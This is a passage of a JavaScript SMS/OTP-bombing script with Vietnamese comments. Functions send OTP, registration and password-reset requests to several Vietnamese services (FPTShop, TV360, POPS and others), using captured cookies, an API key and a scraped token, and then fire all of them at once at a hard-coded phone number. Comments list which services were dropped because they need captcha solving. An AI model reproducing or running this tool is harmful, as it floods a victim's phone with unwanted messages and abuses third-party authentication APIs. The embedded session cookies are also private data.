        "Cookie": "_gcl_au=1.1.1035312395.1712383100; _gid=GA1.3.1714376523.1712383101; fpt_uuid=%229193e2bd-3fa5-4f11-b66e-bf97ceb13162%22; ajs_group_id=null; _sp_ses.d55b=*; log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc=c8e0414d-9732-4c58-9a9f-0b71dd07f625; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22ZOObHieddPnu64RGp71O%22%7D; __zi=3000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_yX0Iyz-rUpfsqyLntUReEtQIn70CfsZxPT34i4qbQ7iD30.1; __admUTMtime=1712383103; _fbp=fb.2.1712383104361.546554100; _tt_enable_cookie=1; _ttp=ytEEE2pneUl5qtbKVIBJ4X4ndkv; cf_clearance=K0Au7B5Njng4EFS_FZrEc9M661CTdgl7H5EVr4sCpX0-1712383105-1.0.1.1-L8QDjip4m6EWtZHxfnUqq4m6_VF7d_tmZ2b5hqXJpfCuhxRU5BbBZxqhq9GE.nA3BMfQZMp3igo.OcKBKu4sDw; _hjSession_731679=eyJpZCI6IjVkMzJlNjUyLTIyYTQtNGNmYS04YWRmLWU1MjZhNDhiOTg1MSIsImMiOjE3MTIzODMxMDU4NjcsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; dtdz=1b95a7f8-403b-5695-b11f-d80f06f20f70; __adm_upl=eyJ0aW1lIjoxNzEyMzg0OTA2LCJfdXBsIjpudWxsfQ==; __iid=; __iid=; __su=0; __su=0; __RC=31; __R=2; _ga=GA1.3.1258175437.1712383100; _sp_id.d55b=26f13fc5-e324-4d1f-83ff-14abe8cecf5a.1712383101.1.1712383243..fde04cd0-a6f6-4003-998d-4f939509c349....0; _aff_network=accesstrade; _aff_sid=PNtuaRfF6uzdkDIxIP3B5X2B7URuX7sOFhdrU26DGxig77DW; _hjSessionUser_731679=eyJpZCI6IjliYTIxNTFmLTMwYWEtNTE2Ny04NTc2LThiMzZhYTM0NGI5ZSIsImNyZWF0ZWQiOjE3MTIzODMxMDU4NjQsImV4aXN0aW5nIjp0cnVlfQ==; __utm=source%3Daccesstrade%7Cmedium%3Dcps%7Ccampaign%3DMjvvG5%7Ccontent%3DaweZ21FamqZt7WA; __utm=source%3Daccesstrade%7Cmedium%3Dcps%7Ccampaign%3DMjvvG5%7Ccontent%3DaweZ21FamqZt7WA; __uif=__uid%3A2123763352159191353%7C__ui%3A-1%7C__create%3A1712376335; __tb=0; __IP=1952623655; _gat=1; _ga_ZR815NQ85K=GS1.1.1712383100.1.1.1712383362.60.0.0; vMobile=2",
        "X-Requested-With": "XMLHttpRequest",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "macOS"
    };
    const data = { "phone": phone, "typeReset": 0 };

    // Gửi yêu cầu OTP đến FPTSHOP
    const response = await axios.post("https://fptshop.com.vn/api-data/loyalty/Login/Verification", data, { headers });
    console.log(response.data)
    if (response.data.datas.expiredSeconds === "299") {
        return true;
    } else {
        return false;
    }
}

// Hàm TV360
async function TV360(phone) {
    const url = "http://m.tv360.vn/public/v1/auth/get-otp-login";
    const data = { "msisdn": phone };
    const headers = {
        "Host": "m.tv360.vn",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Linux; Android 11; SM-A217F Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "Origin": "http://m.tv360.vn",
        "Referer": "http://m.tv360.vn/login?r=http%3A%2F%2Fm.tv360.vn%2F",
        "Cookie": "img-ext=avif; session-id=s%3A80c6fbad-d7e1-4dac-92a6-6cb5897bcf98.vnOf3K%2B010rNLX1ydurEP6VbvWURhbu4yAmsZ7EoxqQ; device-id=s%3Awap_649b61fe-eafa-4467-a902-894759722239.Z3iCDzH0lKHxKMRhPojvaWT%2BOFwOmZpVB11XnqALrJM; screen-size=s%3A385x854.YsJCQUjKOJSkUOYLfVhMNjngvj0EBsElrxhbkBkUaj0; access-token=; refresh-token=; msisdn=; profile=; user-id=; auto-login=1; G_ENABLED_IDPS=google"
    };

    // Gửi yêu cầu OTP đến TV360
    const response = await axios.post(url, data, { headers });
    console.log(response.data);
    if (response.data.errorCode === 200) {
        return true;
    } else {
        return false;
    }
}

// Hàm POPS
async function POPS(phone) {
    const headers = {
        "Host": "pops.vn",
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
        "accept": "*/*",
        "origin": "https://pops.vn",
        "referer": "https://pops.vn/auth/signin-signup/signup",
        "cookie": "ssid=:1678719841"
    };
    const accessResponse = await axios.get("https://pops.vn/auth/signin-signup/signup", { headers });
    const token = accessResponse.data.match(/"DEFAULT_TOKEN":"(.+?)"/)[1];
    headers.profileid = "64078d77bb84c700517c9ce4";
    headers.authorization = token;
    headers["x-env"] = "production";
    headers["lang"] = "vi";
    headers["sub-api-version"] = "1.1";
    headers["api-key"] = "5d2300c2c69d24a09cf5b09b";
    headers["platform"] = "wap";
    const data = {
        "fullName": "",
        "account": phone,
        "password": "123456789",
        "confirmPassword": "123456789"
    };

    // Gửi yêu cầu OTP đến POPS
    let response = await axios.post("https://products.popsww.com/api/v5/auths/register", data, { headers });
    console.log(response.data);
    if (response.data.meta) {
        return true;
    } else if (response.data.error.statusCode === 400) {
        data.account = phone;
        response = await axios.post("https://products.popsww.com/api/v5/auths/forgotPassword", data, { headers });
        if (response.data.data.status === "OK") {
            return true;
        } else {
            return true;
        }
    }
}


async function SEND_SMS(phone) {
    const SEND_SMS = {};
    try {
        const responses = await Promise.all([
            VAYVND(phone),
           // LOSHIP(phone), // lỗi bên đó
            //F88(phone), // cần giải captcha
            TAMO(phone), 
            META(phone),
            VIETTELL(phone),
            VETTELL2(phone),
            ZALOPAY(phone),
            VTPAY(phone),
            FPTSHOP(phone),
            TV360(phone),
            POPS(phone),
           // MCREDIT(phone),// cần giải captcha
            //CAYDENTHAN(phone), // lỗi web
            //DAIHOCFPT(phone), // cần giải captcha
            //CAFELAND(phone), // cần giải captcha
            //FINDO(phone),// web lỗi
            WINMART(phone),
            OLDFACEBOOK(phone)
        ]);

        responses.forEach((response, index) => {
            const functionName = getFunctionName(index);
            SEND_SMS[functionName] = response;
        });
        return SEND_SMS;
    } catch (error) {
        console.error("Error:", error);
        return SEND_SMS;
    }
}


SEND_SMS("0393000360").then(result => {
    console.log(result);
}).catch((error) => console.log(error));